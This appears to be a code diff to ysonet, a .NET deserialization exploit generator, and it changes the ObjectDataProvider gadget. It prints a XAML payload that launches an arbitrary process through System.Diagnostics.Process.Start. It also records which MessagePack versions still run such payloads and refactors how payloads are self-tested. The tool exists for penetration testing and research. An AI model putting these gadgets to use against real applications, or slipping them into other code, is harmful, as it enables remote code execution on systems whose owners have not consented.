@@ -66,6 +66,16 @@ namespace ysonet.Generators
             // Xaml carries TWO variants: the plain provider and the ResourceDictionary
             // container. The URL payload is the ResourceDictionary gadget now, and the
             // WorkflowDesigner wrapper is the WorkflowDesigner gadget.
+            //
+            // The two MessagePack cells are KEPT even though the version this project pins
+            // refuses them, and that is a deliberate call rather than an oversight. The wall
+            // is MessagePack's own hardcoded deny list, and it is a property of the TARGET's
+            // MessagePack build, not of the payload: the type was added to that list in
+            // 2.5.205 and 3.1.5, and on anything older the same bytes still fire. Dropping
+            // the cells would hide a technique that works on most deployed builds; the
+            // condition is stated in AdditionalInfo() instead, which is where a library
+            // version belongs, and ObjectDataProviderMessagePackHitsTheLibraryDenyList
+            // measures both halves.
             return new List<string> { "Xaml (2)", "Json.NET", "FastJson", "JavaScriptSerializer", "XmlSerializer (2)", "DataContractSerializer (2)", "YamlDotNet < 5.0.0", "FsPickler", "SharpSerializerBinary", "SharpSerializerXml", "MessagePackTypeless", "MessagePackTypelessLz4" };
         }
 
@@ -73,7 +83,7 @@ namespace ysonet.Generators
         {
             OptionSet options = new OptionSet()
             {
-                {"var|variant=", "Payload variant number where applicable. Choices: 1, 2 based on formatter. NOTE: two variants left this gadget. Variant 3 was the ResourceDictionary XAML-url payload and is now the ResourceDictionary gadget, whose -c is the URI. Variant 4 was the WorkflowDesigner wrapper and is now the WorkflowDesigner gadget, which also reaches Json.NET, FastJson, JavaScriptSerializer, both SharpSerializer modes and both MessagePack Typeless flavours.", v => int.TryParse(v, out variant_number) },
+                {"var|variant=", "Payload variant number. The (N) formatter suffix counts these variants; bare formatters support only variant 1. Choices: 1, 2 based on formatter. NOTE: two variants left this gadget. Variant 3 was the ResourceDictionary XAML-url payload and is now the ResourceDictionary gadget, whose -c is the URI. Variant 4 was the WorkflowDesigner wrapper and is now the WorkflowDesigner gadget, which also reaches Json.NET, FastJson, JavaScriptSerializer, both SharpSerializer modes and both MessagePack Typeless flavours.", v => int.TryParse(v, out variant_number) },
             };
 
             return options;
@@ -95,14 +105,24 @@ namespace ysonet.Generators
             return "Reaching a .NET Framework 3.5 target needs --legacyfx, which rewrites the"
                 + " PresentationFramework identity to 3.0.0.0. Measured there on XmlSerializer"
                 + " and JavaScriptSerializer; DataContractSerializer binds every assembly and"
-                + " still fails to build the projected property on the 3.0 reader.";
+                + " still fails to build the projected property on the 3.0 reader."
+                // The MessagePack gate is a LIBRARY version, not a framework one, so it
+                // cannot live in the version facet and belongs here. Both boundaries are
+                // measured from the shipped assemblies, not read off a changelog.
+                + " The two MessagePack Typeless cells depend on the target's MessagePack"
+                + " version: MessagePack carries its own hardcoded deny list, and"
+                + " System.Windows.Data.ObjectDataProvider joined it in 2.5.205 and in 3.1.5."
+                + " Below those (2.5.198 and 3.1.4 and older, which is every release the"
+                + " technique was published against) the list held only TempFileCollection and"
+                + " IWbemClassObjectFreeThreaded and the payload fires; on 2.5.205+ or 3.1.5+"
+                + " the reader refuses it by name and nothing runs.";
         }
 
         // Variant meaning depends on the formatter. Three of them branch on the number, and
         // SupportedFormatters() annotates exactly those three: Xaml (the ResourceDictionary
         // container), XmlSerializer (a LosFormatter inner payload) and DataContractSerializer
-        // (a different MethodParameters shape). The other nine ignore the number and always
-        // build variant 1.
+        // (a different MethodParameters shape). Variant 2 opts out of the other nine so a
+        // direct request cannot silently receive variant 1.
         //
         // TWO VARIANTS RETIRED, and the numbers are NOT reused. Variant 3 was the
         // "ResourceDictionary Source=URL" payload (a different effect: it fetches) and
@@ -130,6 +150,11 @@ namespace ysonet.Generators
                 // An override replaces the WHOLE facet set, so everything the gadget-level set
                 // declares is repeated here on purpose.
                 new GadgetVariant(2, "ResourceDictionary wrapper (Xaml) / LosFormatter inner (XmlSerializer)")
+                    .Without(Formatters.JsonNet, Formatters.FastJson,
+                        Formatters.JavaScriptSerializer, Formatters.YamlDotNet,
+                        Formatters.FsPickler, Formatters.SharpSerializerBinary,
+                        Formatters.SharpSerializerXml, Formatters.MessagePackTypeless,
+                        Formatters.MessagePackTypelessLz4)
                     .WithFacets(new GadgetFacetSet()
                         .WithKinds(PayloadKind.CodeExecution)
                         .WithRequirements(GadgetRequirement.BuiltIn, GadgetRequirement.Wpf,
@@ -184,6 +209,7 @@ namespace ysonet.Generators
         public override object Generate(string formatter, InputArgs inputArgs)
         {
             RefuseRetiredVariant();
+            GuardVariantFormatter(variant_number, formatter);
 
             // NOTE: What is Xaml2? Xaml2 uses ResourceDictionary in addition to just using ObjectDataProvider as in Xaml
             if (formatter.ToLower().Equals("xaml"))
@@ -560,8 +586,8 @@ namespace ysonet.Generators
 
                 String internalPayload = @"<ResourceDictionary xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation"" xmlns:d=""http://schemas.microsoft.com/winfx/2006/xaml"" xmlns:b=""clr-namespace:System;assembly=mscorlib"" xmlns:c=""clr-namespace:System.Diagnostics;assembly=system""><ObjectDataProvider d:Key="""" ObjectType=""{d:Type c:Process}"" MethodName=""Start"">" + cmdPart + @"</ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>";
 
-                // The XAML goes into a DOUBLE quoted JSON string below, so only \ and " are
-                // escaped. JsonStringEscape would also write \', which no JSON defines.
+                // The XAML goes into a DOUBLE quoted JSON string below. JsonStringEscape
+                // would also write \', which no JSON defines.
                 internalPayload = CommandArgSplitter.JsonDoubleQuotedStringEscape(internalPayload);
 
                 String payload = @"{
@@ -655,6 +681,14 @@ namespace ysonet.Generators
                 exclusionList = new KeyValuePair<Type, List<String>>(odp.GetType(), ourExcludedProperties);
                 allExclusions.Add(exclusionList);
 
+                // Both flavours hand the finished payload to the SHARED step, like every
+                // other branch above, instead of running their own deserialize in a bare
+                // catch. That local check silently opted these cells out of everything the
+                // shared step owns: the --legacyfx boundary (its operator-input guard and
+                // its "this format has no identity surface" note) and the whole self-test
+                // entry point, so -t could never report why a payload failed. alreadyMinified
+                // is true because the XML flavour shrinks itself just above, with its own
+                // discard list, and the binary one has no text to shrink.
                 if (formatter.ToLowerInvariant().Equals("sharpserializerxml"))
                 {
                     var serializedData = SerializersHelper.SharpSerializer_Xml_serialize_WithExclusion_ToString(odp, allExclusions);
@@ -664,29 +698,12 @@ namespace ysonet.Generators
                         serializedData = XmlMinifier.Minify(serializedData, null, new string[] { @" name=""r""" }, FormatterType.DataContractXML, true);
                     }
 
-
-                    if (inputArgs.Test)
-                    {
-                        try
-                        {
-                            SerializersHelper.SharpSerializer_Xml_deserialize_FromString(serializedData);
-                        }
-                        catch { }
-                    }
-                    return serializedData;
+                    return FinishHandWrittenPayload(serializedData, formatter, inputArgs, null, true);
                 }
                 else
                 {
                     var serializedData = SerializersHelper.SharpSerializer_Binary_serialize_WithExclusion_ToByteArray(odp, allExclusions);
-                    if (inputArgs.Test)
-                    {
-                        try
-                        {
-                            SerializersHelper.SharpSerializer_Binary_deserialize_FromByteArray(serializedData);
-                        }
-                        catch { }
-                    }
-                    return serializedData;
+                    return FinishHandWrittenPayload(serializedData, formatter, inputArgs, null, true);
                 }
             }
             else if (IsMessagePackTypeless(formatter))
@@ -696,15 +713,11 @@ namespace ysonet.Generators
                     inputArgs.CmdArguments,
                     IsMessagePackLz4(formatter));
 
-                if (inputArgs.Test)
-                {
-                    try
-                    {
-                        MessagePackTypelessTypeSwap.Deserialize(serializedData, IsMessagePackLz4(formatter));
-                    }
-                    catch { }
-                }
-                return serializedData;
+                // Same shared step as every branch above. It matters most HERE: on a
+                // MessagePack build that carries this type on its deny list, -t is the only
+                // way an operator learns the reader refused the payload by name, and the
+                // bare catch that used to sit here threw that message away.
+                return FinishHandWrittenPayload(serializedData, formatter, inputArgs);
             }
             else
             {
